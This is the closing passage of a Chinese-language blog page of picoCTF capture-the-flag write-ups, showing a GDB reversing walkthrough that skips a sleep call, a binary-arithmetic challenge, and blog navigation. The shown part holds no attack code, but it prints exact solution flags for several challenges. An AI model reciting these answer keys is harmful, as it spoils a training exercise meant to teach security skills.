find_pico_ctf(hidden_message)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Reverse">Reverse</h1>
<h2 id="GDB-Test-Drive">GDB Test Drive</h2>
<p>這題的話先用<code>wget</code>把題目這個二進制檔案抓下來。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701212911463.png" alt="Wget"></p>
<p>然後後面的步驟基本上就照著題目給的指令一步一步來就可以了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213346170.png" alt="Instructions"></p>
<p>這邊來稍微解釋一下每個指令的意義，他到底是做了哪些事情呢？</p>
<ul>
<li><code>chmod +x gdbme</code>
<ul>
<li>修改 gdbme 檔案的權限，新增執行權限（x）</li>
</ul>
</li>
<li><code>gdb gdbme</code>
<ul>
<li>使用 gdb（GNU Debugger）打開 gdbme 這個可執行檔案。</li>
</ul>
</li>
<li><code>layout asm</code>
<ul>
<li>啟用組合語言（Assembly, ASM）視圖</li>
</ul>
</li>
<li><code>break *(main+99)</code>
<ul>
<li>在 main 函數開始偏移 99 的位元組的地方設置斷點（Breakpoint）。</li>
</ul>
</li>
<li><code>jump *(main+104)</code>
<ul>
<li>跳到 main 函數開始偏移 104 位元組的地方繼續執行。</li>
</ul>
</li>
</ul>
<p>至於這邊為甚麼要在 main+99 的地方設定斷點，是因為這裡他調用了一個函式叫做<code>sleep</code>，所以當我們直接執行 gdbme 的時候會進入到<strong>sleep</strong>的狀態，讓我們以為這個程式沒有做任何事。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/H1IxfrlvA.png" alt="Sleep function"></p>
<p>所以在這邊我們才要把斷點設在 main+99，讓他執行到這邊的時候暫停一下，然後我們直接使用 jump 叫到下面一個地方，也就是 main+104 繼續執行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213211218.png" alt="Flag"></p>
<p>這樣就得到 flag 啦。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;d3bugg3r_dr1v3_72bd8355&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Misc-General-Skills">Misc (General Skills)</h1>
<h2 id="binhexa">binhexa</h2>
<p>這題比較簡單，就是一些基礎的 Binary operations 和最後把 bin 轉為 hexadecimal 就行了，它主要有六題的邏輯運算和一題 bin to hexadecimal。我是直接使用 picoCTF 提供的 Webshell 進行 nc 連接，然後用<a target="_blank" rel="noopener" href="https://www.rapidtables.com/calc/math/binary-calculator.html">這個線上工具</a>運算。題目如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Binary Number 1: 00101010</span><br><span class="line">Binary Number 2: 00101011</span><br><span class="line"></span><br><span class="line">Question 1/6:</span><br><span class="line">Operation 1: &#x27;&amp;&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 00101010</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 2/6:</span><br><span class="line">Operation 2: &#x27;*&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 11100001110</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 3/6:</span><br><span class="line">Operation 3: &#x27;&lt;&lt;&#x27;</span><br><span class="line">Perform a left shift of Binary Number 1 by 1 bits.</span><br><span class="line">Enter the binary result: 1010100</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 4/6:</span><br><span class="line">Operation 4: &#x27;+&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 1010101</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 5/6:</span><br><span class="line">Operation 5: &#x27;|&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 00101011</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 6/6:</span><br><span class="line">Operation 6: &#x27;&gt;&gt;&#x27;</span><br><span class="line">Perform a right shift of Binary Number 2 by 1 bits.</span><br><span class="line">Enter the binary result: 10101</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Enter the results of the last operation in hexadecimal: 15</span><br><span class="line"></span><br><span class="line">Correct answer!</span><br><span class="line">The flag is: picoCTF&#123;b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e&#125;</span><br></pre></td></tr></table></figure>
<p>這樣就得到 flag 啦！Easy peasy。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="頭像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" title="頭像" alt="頭像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" title="頭像" alt="頭像"></a><div class="post-copyright__author_name">CX330</div><div class="post-copyright__author_desc">Hack the planet!</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="This article is original. Please be mindful of the copyright agreement." href="https://cx330.tw/posts/4f98706e/">Original</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://cx330.tw/posts/4f98706e/')">All-in-One PicoCTF Writeups</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="Support the author"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>Support</div><div class="reward-main"><div class="reward-all"><span class="reward-title">Thank's for supporting me!</span><ul class="reward-group"><li class="reward-item"><a href="https://buymeacoffee.com/cx330" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/buymeacoffee.png" alt="Buy Me a Coffee"/></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="https://cx330.tw" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="CX330"/></a><div class="post-qr-code-desc">CX330</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">Sponsor List</div><div class="reward-dec">Really thanks for your coffee🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="Copy link" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/PicoCTF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>PicoCTF<span class="tagsPageCount">8</span></a><a class="post-meta__box__tags" href="/tags/%E8%B3%87%E5%AE%89/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>資安<span class="tagsPageCount">6</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/e6118152/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/CX330.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Why Do I Start Blogging</div></div></a></div><div class="next-post pull-right"><a href="/posts/d01f5ccf/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_81ff509e73230b8e44daafad39fe99e0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2024 AIS3 Pre-exam Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/6431e3b0/" title="[Day 01] Grinding PicoCTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-26</div><div class="title">[Day 01] Grinding PicoCTF</div></div></a></div><div><a href="/posts/4c6f99b3/" title="[Day 04] Grinding PicoCTF 2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-29</div><div class="title">[Day 04] Grinding PicoCTF 2</div></div></a></div><div><a href="/posts/a4b22abb/" title="[Day 05] Grinding PicoCTF 3"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-01</div><div class="title">[Day 05] Grinding PicoCTF 3</div></div></a></div><div><a href="/posts/41c83dfb/" title="[Day 06] Grinding PicoCTF 4"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-02</div><div class="title">[Day 06] Grinding PicoCTF 4</div></div></a></div><div><a href="/posts/a9158ef3/" title="[Day 07] Grinding PicoCTF 5"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-04</div><div class="title">[Day 07] Grinding PicoCTF 5</div></div></a></div><div><a href="/posts/7c095067/" title="[Day 08] Grinding PicoCTF 6"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-06</div><div class="title">[Day 08] Grinding PicoCTF 6</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> Comment</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)" style="display: none">匿名評論</a><a href="/privacy" style="margin-left: 4px">Privacy policy</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你無需刪除空行，直接評論以獲取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div><script>document.addEventListener("DOMContentLoaded", function() {
  var pageLang = "en";
  document.documentElement.lang = pageLang || 'en';
});

document.addEventListener("pjax:complete", function() {
  var pageLang = "en";
  document.documentElement.lang = pageLang || 'en';
});</script></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/sunglasses.png" alt="status"/></div></div><div class="author-info__description">This is CX330's blog. I share something about hacking, CTF, developing, and other interesting stuff. GLHF!</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">CX330</h1><div class="author-info__desc">Hack the planet!</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/CX330Blake" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://www.facebook.com/profile.php?id=100011698690769" target="_blank" title="Facebook"><i class="fa-brands fa-facebook faa-tada"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>Announcement</span></div><div class="announcement_content">3735928559</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#unminify"><span class="toc-number">2.1.</span> <span class="toc-text">unminify</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picobrowser"><span class="toc-number">2.2.</span> <span class="toc-text">picobrowser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLiLite"><span class="toc-number">2.3.</span> <span class="toc-text">SQLiLite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More-SQLi"><span class="toc-number">2.4.</span> <span class="toc-text">More SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trickster"><span class="toc-number">2.5.</span> <span class="toc-text">Trickster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Super-Serial"><span class="toc-number">2.6.</span> <span class="toc-text">Super Serial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Code-Analysis"><span class="toc-number">2.7.</span> <span class="toc-text">Java Code Analysis!?!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy1"><span class="toc-number">3.1.</span> <span class="toc-text">Easy1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Caesar"><span class="toc-number">3.2.</span> <span class="toc-text">Caesar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#New-Caesar"><span class="toc-number">3.3.</span> <span class="toc-text">New Caesar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rotation"><span class="toc-number">3.4.</span> <span class="toc-text">rotation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mind-your-Ps-and-Qs"><span class="toc-number">3.5.</span> <span class="toc-text">Mind your Ps and Qs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-padding-no-problem"><span class="toc-number">3.6.</span> <span class="toc-text">No padding, no problem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#interencdec"><span class="toc-number">3.7.</span> <span class="toc-text">interencdec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-peasy"><span class="toc-number">3.8.</span> <span class="toc-text">Easy peasy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Custom-encryption"><span class="toc-number">3.9.</span> <span class="toc-text">Custom encryption</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mini-RSA"><span class="toc-number">3.10.</span> <span class="toc-text">Mini RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#miniRSA"><span class="toc-number">3.11.</span> <span class="toc-text">miniRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b00tl3gRSA2"><span class="toc-number">3.12.</span> <span class="toc-text">b00tl3gRSA2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b00tl3gRSA3"><span class="toc-number">3.13.</span> <span class="toc-text">b00tl3gRSA3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-Binary-Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Pwn (Binary Exploitation)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-Target"><span class="toc-number">4.1.</span> <span class="toc-text">Local Target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-overflow-0"><span class="toc-number">4.2.</span> <span class="toc-text">buffer overflow 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-overflow-1"><span class="toc-number">4.3.</span> <span class="toc-text">buffer overflow 1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">5.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSB"><span class="toc-number">5.1.</span> <span class="toc-text">MSB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">6.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GDB-Test-Drive"><span class="toc-number">6.1.</span> <span class="toc-text">GDB Test Drive</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-General-Skills"><span class="toc-number">7.</span> <span class="toc-text">Misc (General Skills)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#binhexa"><span class="toc-number">7.1.</span> <span class="toc-text">binhexa</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/11af25ee/" title="[Day 12] 繼續刷HTB的題目！"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[Day 12] 繼續刷HTB的題目！"/></a><div class="content"><a class="title" href="/posts/11af25ee/" title="[Day 12] 繼續刷HTB的題目！">[Day 12] 繼續刷HTB的題目！</a><time datetime="2024-07-16T15:56:11.000Z" title="Created 2024-07-16 23:56:11">2024-07-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/cab519b8/" title="[HTB] Insomnia Writeup 💤"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[HTB] Insomnia Writeup 💤"/></a><div class="content"><a class="title" href="/posts/cab519b8/" title="[HTB] Insomnia Writeup 💤">[HTB] Insomnia Writeup 💤</a><time datetime="2024-07-16T09:49:39.000Z" title="Created 2024-07-16 17:49:39">2024-07-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/acba6120/" title="[HTB] The Last Dance Writeup 💃"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[HTB] The Last Dance Writeup 💃"/></a><div class="content"><a class="title" href="/posts/acba6120/" title="[HTB] The Last Dance Writeup 💃">[HTB] The Last Dance Writeup 💃</a><time datetime="2024-07-15T17:30:34.000Z" title="Created 2024-07-16 01:30:34">2024-07-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b5f171c7/" title="[Day 11] 把SCIST季後賽的writeup整理了下"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[Day 11] 把SCIST季後賽的writeup整理了下"/></a><div class="content"><a class="title" href="/posts/b5f171c7/" title="[Day 11] 把SCIST季後賽的writeup整理了下">[Day 11] 把SCIST季後賽的writeup整理了下</a><time datetime="2024-07-15T07:55:47.000Z" title="Created 2024-07-15 15:55:47">2024-07-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9deb0a60/" title="SCIST S4 資訊安全季後賽 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/306501105_421181870151313_2861616243724572793_n.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SCIST S4 資訊安全季後賽 Writeup"/></a><div class="content"><a class="title" href="/posts/9deb0a60/" title="SCIST S4 資訊安全季後賽 Writeup">SCIST S4 資訊安全季後賽 Writeup</a><time datetime="2024-07-14T14:59:31.000Z" title="Created 2024-07-14 22:59:31">2024-07-14</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/CX330Blake" title="GitHub"><i class="fa-brands fa-github"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100011698690769" title="Facebook"><i class="fa-brands fa-facebook"></i></a><a class="deal_link" href="mailto:timchen975@gmail.com" title="Email"><i class="fa-solid fa-envelope"></i></a><img class="footer_mini_logo" title="Back to top" alt="Back to top" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://discord.com/users/718263896187732049" title="Discord"><i class="fa-brands fa-discord"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en" title="CC"><i class="fa-regular fa-copyright"></i></a></div><div id="anzhiyu-footer"><div class="footer-group"><div class="footer-title">Articles</div><div class="footer-links"><a class="footer-item" title="Archives" href="/archives/">Archives</a><a class="footer-item" title="Categories" href="/categories/">Categories</a><a class="footer-item" title="Tags" href="/tags/">Tags</a></div></div><div class="footer-group"><div class="footer-title">Social center</div><div class="footer-links"><a class="footer-item" title="Sites" href="/link/">Sites</a><a class="footer-item" title="Message board" href="/comments/">Message board</a></div></div><div class="footer-group"><div class="footer-title">My</div><div class="footer-links"><a class="footer-item" title="Music bar" href="/music/?id=12295857597&amp;server=netease">Music bar</a><a class="footer-item" title="Talks" href="/essay/">Talks</a><a class="footer-item" title="Books" href="/notyet/">Books</a><a class="footer-item" title="Photos" href="/album/">Photos</a></div></div><div class="footer-group"><div class="footer-title">About</div><div class="footer-links"><a class="footer-item" title="Whoami" href="/about/">Whoami</a><a class="footer-item" title="Subscribe" href="/subscribe/">Subscribe</a><a class="footer-item" title="Support me" target="_blank" rel="noopener" href="https://buymeacoffee.com/cx330">Support me</a></div></div><div class="footer-group"><div class="footer-title-group"><div class="footer-title">Link exchange</div><a class="random-friends-btn" id="footer-random-friends-btn" href="javascript:addFriendLinksInFooter();" title="換一批友情鏈接"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i></a></div><div class="footer-links" id="friend-links-in-footer"></div></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 By <a class="footer-bar-link" href="/" title="CX330" target="_blank">CX330</a></div></div><div id="footer-type-tips"></div><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#footer-type-tips", {
      strings: ["Yes, I am a criminal. My crime is that of curiosity.","Happy hacking","Build the universe with me","Hack the planet!"],
      startDelay: 300,
      typeSpeed: 200,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("footer-type-tips").innerHTML = 'Yes, I am a criminal. My crime is that of curiosity.'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js@2.1.0/dist/typed.umd.min.js').then(subtitleType)
  }
} else {
  subtitleType()
